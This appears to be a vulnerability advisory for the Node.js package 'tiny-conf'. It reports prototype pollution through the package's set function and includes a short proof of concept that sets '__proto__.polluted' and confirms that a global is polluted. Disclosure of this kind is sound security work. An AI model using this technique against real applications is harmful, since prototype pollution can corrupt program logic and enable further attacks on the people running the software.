# Overview

`tiny-conf` is a Node.js configuration with files, environment variables, command-line arguments, ... pluggable architecture in order to work in the browser & server-side.

This package are vulnerable to Prototype Pollution via. the `set` function.

# Proof of Concept
```
const tinyConf = require('tiny-conf'); 
tinyConf.set('__proto__.polluted', true); 
console.log(polluted); //true
```